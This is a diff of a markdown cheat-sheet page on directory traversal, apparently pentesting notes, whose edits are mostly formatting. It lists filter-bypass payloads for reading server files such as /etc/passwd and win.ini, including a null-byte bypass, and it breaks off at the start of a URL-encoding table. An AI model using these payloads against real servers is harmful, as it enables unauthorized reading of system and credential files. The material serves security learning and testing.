@@ -6,21 +6,25 @@ coverY: 0
 
 # Directory Traversal
 
-#### Directory traversal (or path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application.&#x20;
+Directory traversal (or path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application.&#x20;
 
-#### This might include application code and data, credentials for back-end systems and sensitive operating system files.
+This might include application code and data, credentials for back-end systems and sensitive operating system files.
 
 ## <mark style="color:red;">Bypass path traversal filters</mark>
 
 ```
 ..\..\..\windows\win.ini --> Windows OS
+
 ../../../etc/passwd
+
 ....//....//....//etc/passwd
+
 /var/www/images/../../../etc/passwd 
+
 ../../../etc/passwd%00.png --> null byte bypass
 ```
 
-### <mark style="color:yellow;">**URL Encoding**</mark>
+## <mark style="color:red;">**URL Encoding**</mark>
 
 | char | encode          |
 | ---- | --------------- |
